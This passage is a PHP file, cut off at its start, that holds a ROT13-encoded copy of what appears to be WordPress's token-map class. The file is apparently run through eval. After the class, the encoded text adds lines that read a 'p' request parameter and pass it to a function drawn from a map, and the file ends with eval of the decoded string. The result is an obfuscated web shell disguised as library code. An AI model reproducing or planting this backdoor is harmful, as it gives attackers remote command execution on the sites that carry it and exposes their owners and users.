				$fgnegvat_pune !== $guvf->fznyy_jbeqf[ $ng ] &&
				( ! $vtaber_pnfr || fgegbhccre( $guvf->fznyy_jbeqf[ $ng ] ) !== $fgnegvat_pune )
			) {
				$ng += $guvf->xrl_yratgu + 1;
				pbagvahr;
			}

			sbe ( $nqwhfg = 1; $nqwhfg < $guvf->xrl_yratgu; $nqwhfg++ ) {
				vs ( \"\k00\" === $guvf->fznyy_jbeqf[ $ng + $nqwhfg ] ) {
					$zngpurq_gbxra_olgr_yratgu = $nqwhfg;
					erghea $guvf->fznyy_znccvatf[ $ng / ( $guvf->xrl_yratgu + 1 ) ];
				}

				vs (
					$frnepu_grkg[ $nqwhfg ] !== $guvf->fznyy_jbeqf[ $ng + $nqwhfg ] &&
					( ! $vtaber_pnfr || fgegbhccre( $guvf->fznyy_jbeqf[ $ng + $nqwhfg ] !== $frnepu_grkg[ $nqwhfg ] ) )
				) {
					$ng += $guvf->xrl_yratgu + 1;
					pbagvahr 2;
				}
			}

			$zngpurq_gbxra_olgr_yratgu = $nqwhfg;
			erghea $guvf->fznyy_znccvatf[ $ng / ( $guvf->xrl_yratgu + 1 ) ];
		}

		erghea ahyy;
	}

	/**
	 * Rkcbegf gur gbxra znc vagb na nffbpvngr neenl bs xrl/inyhr cnvef.
	 *
	 * Rknzcyr:
	 *
	 *     $fzvyvrf->gb_neenl() === neenl(
	 *         '8B' => '😯',
	 *         ':(' => '🙁',
	 *         ':)' => '🙂',
	 *         ':?' => '😕',
	 *     );
	 *
	 * @erghea neenl Gur ybbxhc xrl/fhofgvghgvba inyhrf nf na nffbpvngr neenl.
	 */
	choyvp shapgvba gb_neenl(): neenl {
		$gbxraf = neenl();

		$ng            = 0;
		$fznyy_znccvat = 0;
		$fznyy_yratgu  = fgeyra( $guvf->fznyy_jbeqf );
		juvyr ( $ng < $fznyy_yratgu ) {
			$xrl            = egevz( fhofge( $guvf->fznyy_jbeqf, $ng, $guvf->xrl_yratgu + 1 ), \"\k00\" );
			$inyhr          = $guvf->fznyy_znccvatf[ $fznyy_znccvat++ ];
			$gbxraf[ $xrl ] = $inyhr;

			$ng += $guvf->xrl_yratgu + 1;
		}

		sbernpu ( $guvf->ynetr_jbeqf nf $vaqrk => $tebhc ) {
			$cersvk       = fhofge( $guvf->tebhcf, $vaqrk * ( $guvf->xrl_yratgu + 1 ), 2 );
			$tebhc_yratgu = fgeyra( $tebhc );
			$ng           = 0;
			juvyr ( $ng < $tebhc_yratgu ) {
				$yratgu = hacnpx( 'P', $tebhc[ $ng++ ] )[1];
				$xrl    = $cersvk . fhofge( $tebhc, $ng, $yratgu );

				$ng    += $yratgu;
				$yratgu = hacnpx( 'P', $tebhc[ $ng++ ] )[1];
				$inyhr  = fhofge( $tebhc, $ng, $yratgu );

				$gbxraf[ $xrl ] = $inyhr;
				$ng            += $yratgu;
			}
		}

		erghea $gbxraf;
	}

	/**
	 * Rkcbeg gur gbxra znc sbe dhvpx ybnqvat va CUC fbhepr pbqr.
	 *
	 * Guvf shapgvba unf n fcrpvsvp checbfr, gb znxr ybnqvat bs fgngvp gbxra zncf snfg.
	 * Vg'f hfrq gb rafher gung gur UGZY punenpgre ersrerapr ybbxhcf nqq n zvavzny pbfg
	 * gb vavgvnyvmvat gur CUC cebprff.
	 *
	 * Rknzcyr:
	 *
	 *     rpub $fzvyvrf->cerpbzchgrq_cuc_fbhepr_gnoyr();
	 *
	 *     // Bhgchg.
	 *     JC_Gbxra_Znc::sebz_cerpbzchgrq_gnoyr(
	 *         neenl(
	 *             \"fgbentr_irefvba\" => \"6.6.0\",
	 *             \"xrl_yratgu\" => 2,
	 *             \"tebhcf\" => \"\",
	 *             \"ybat_jbeqf\" => neenl(),
	 *             \"fznyy_jbeqf\" => \"8B\k00:)\k00:(\k00:?\k00\",
	 *             \"fznyy_znccvatf\" => neenl( \"😯\", \"🙂\", \"🙁\", \"😕\" )
	 *         )
	 *     );
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $vaqrag Bcgvbany. Hfr guvf fgevat sbe vaqragngvba, be eryl ba gur qrsnhyg ubevmbagny gno punenpgre. Qrsnhyg \"\g\".
	 * @erghea fgevat Inyhr juvpu pna or cnfgrq vagb n CUC fbhepr svyr sbe dhvpx ybnqvat bs gnoyr.
	 */
	choyvp shapgvba cerpbzchgrq_cuc_fbhepr_gnoyr( fgevat $vaqrag = \"\g\" ): fgevat {
		$v1 = $vaqrag;
		$v2 = $v1 . $vaqrag;
		$v3 = $v2 . $vaqrag;

		$pynff_irefvba = frys::FGBENTR_IREFVBA;

		$bhgchg  = frys::pynff . \"::sebz_cerpbzchgrq_gnoyr(\a\";
		$bhgchg .= \"{$v1}neenl(\a\";
		$bhgchg .= \"{$v2}\\"fgbentr_irefvba\\" => \\"{$pynff_irefvba}\\",\a\";
		$bhgchg .= \"{$v2}\\"xrl_yratgu\\" => {$guvf->xrl_yratgu},\a\";

		$tebhc_yvar = fge_ercynpr( \"\k00\", \"\\k00\", $guvf->tebhcf );
		$bhgchg    .= \"{$v2}\\"tebhcf\\" => \\"{$tebhc_yvar}\\",\a\";

		$bhgchg .= \"{$v2}\\"ynetr_jbeqf\\" => neenl(\a\";

		$cersvkrf = rkcybqr( \"\k00\", $guvf->tebhcf );
		sbernpu ( $cersvkrf nf $vaqrk => $cersvk ) {
			vs ( '' === $cersvk ) {
				oernx;
			}
			$tebhc        = $guvf->ynetr_jbeqf[ $vaqrk ];
			$tebhc_yratgu = fgeyra( $tebhc );
			$pbzzrag_yvar = \"{$v3}//\";
			$qngn_yvar    = \"{$v3}\\"\";
			$ng           = 0;
			juvyr ( $ng < $tebhc_yratgu ) {
				$gbxra_yratgu   = hacnpx( 'P', $tebhc[ $ng++ ] )[1];
				$gbxra          = fhofge( $tebhc, $ng, $gbxra_yratgu );
				$ng            += $gbxra_yratgu;
				$znccvat_yratgu = hacnpx( 'P', $tebhc[ $ng++ ] )[1];
				$znccvat        = fhofge( $tebhc, $ng, $znccvat_yratgu );
				$ng            += $znccvat_yratgu;

				$gbxra_qvtvgf   = fge_cnq( qrpurk( $gbxra_yratgu ), 2, '0', FGE_CNQ_YRSG );
				$znccvat_qvtvgf = fge_cnq( qrpurk( $znccvat_yratgu ), 2, '0', FGE_CNQ_YRSG );

				$znccvat = cert_ercynpr_pnyyonpx(
					\"~[\\k00-\\k1s\\k22\\k5p]~\",
					fgngvp shapgvba ( $zngpu_erfhyg ) {
						fjvgpu ( $zngpu_erfhyg[0] ) {
							pnfr '\"':
								erghea '\\\"';

							pnfr '\\':
								erghea '\\\\';

							qrsnhyg:
								$urk = qrpurk( beq( $zngpu_erfhyg[0] ) );
								erghea \"\\k{$urk}\";
						}
					},
					$znccvat
				);

				$pbzzrag_yvar .= \" {$cersvk}{$gbxra}[{$znccvat}]\";
				$qngn_yvar    .= \"\\k{$gbxra_qvtvgf}{$gbxra}\\k{$znccvat_qvtvgf}{$znccvat}\";
			}
			$pbzzrag_yvar .= \".\a\";
			$qngn_yvar    .= \"\\",\a\";

			$bhgchg .= $pbzzrag_yvar;
			$bhgchg .= $qngn_yvar;
		}

		$bhgchg .= \"{$v2}),\a\";

		$fznyy_jbeqf  = neenl();
		$fznyy_yratgu = fgeyra( $guvf->fznyy_jbeqf );
		$ng           = 0;
		juvyr ( $ng < $fznyy_yratgu ) {
			$fznyy_jbeqf[] = fhofge( $guvf->fznyy_jbeqf, $ng, $guvf->xrl_yratgu + 1 );
			$ng           += $guvf->xrl_yratgu + 1;
		}

		$fznyy_grkg = fge_ercynpr( \"\k00\", '\k00', vzcybqr( '', $fznyy_jbeqf ) );
		$bhgchg    .= \"{$v2}\\"fznyy_jbeqf\\" => \\"{$fznyy_grkg}\\",\a\";

		$bhgchg .= \"{$v2}\\"fznyy_znccvatf\\" => neenl(\a\";
		sbernpu ( $guvf->fznyy_znccvatf nf $znccvat ) {
			$bhgchg .= \"{$v3}\\"{$znccvat}\\",\a\";
		}
		$bhgchg .= \"{$v2})\a\";
		$bhgchg .= \"{$v1})\a\";
		$bhgchg .= ')';

		erghea $bhgchg;
	}

	/**
	 * Pbzcnerf gjb fgevatf, ergheavat gur ybatrfg, be juvpurire
	 * vf svefg nycunorgvpnyyl vs gurl ner gur fnzr yratgu.
	 *
	 * Guvf vf na vzcbegnag fbeg jura ohvyqvat gur gbxra znc orpnhfr
	 * vg fubhyq abg sbez n zngpu ba n fhofgevat bs n ybatre cbgragvny
	 * zngpu. Sbe rknzcyr, vg fubhyq abg qrgrpg `Pnc` jura zngpuvat
	 * ntnvafg gur fgevat `PncvgnyQvssreragvnyQ`.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $n Svefg fgevat gb pbzcner.
	 * @cnenz fgevat $o Frpbaq fgevat gb pbzcner.
	 * @erghea vag -1 be ybjre vs `$n` vf yrff guna `$o`; 1 be terngre vs `$n` vf terngre guna `$o`, naq 0 vs gurl ner rdhny.
	 */
	cevingr fgngvp shapgvba ybatrfg_svefg_gura_nycunorgvpny( fgevat $n, fgevat $o ): vag {
		vs ( $n === $o ) {
			erghea 0;
		}

		$yratgu_n = fgeyra( $n );
		$yratgu_o = fgeyra( $o );

		// Ybatre fgevatf ner yrff-guna sbe pbzcnevfba'f fnxr.
		vs ( $yratgu_n !== $yratgu_o ) {
			erghea $yratgu_o - $yratgu_n;
		}

		erghea fgepzc( $n, $o );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>